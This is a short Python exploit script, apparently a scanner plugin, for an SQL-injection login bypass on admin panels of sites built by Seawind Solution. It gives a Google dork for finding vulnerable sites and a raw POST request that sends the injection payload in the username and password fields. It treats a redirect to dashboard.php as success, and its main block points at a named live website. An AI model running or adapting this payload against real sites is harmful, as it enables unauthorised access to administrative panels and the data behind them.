#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://cxsecurity.com/issue/WLB-2015070122
#] Exploit Author : Ashiyane Digital Security Team
#] Google Dork : intext:"Design & Developed By Seawind Solution Pvt.Ltd."


def assign(service, arg):
    if service == "seawind":
        return True, arg

def audit(arg):
    raw = """POST /adminpanel/index.php HTTP/1.1
Host: www.baidu.com
Content-Length: 59
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

A_USERNAME=%27%3D%27+%27OR%27&A_PASSWORD=%27%3D%27+%27OR%27"""

    url = arg + '/adminpanel/index.php'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)

    if code == 302 and 'location: dashboard.php' in head:
        security_hole(url + "\t'=' 'OR','=' 'OR'")


if __name__ == '__main__':
    from dummy import *
    audit(assign('seawind', 'http://brightsolar.in/')[1])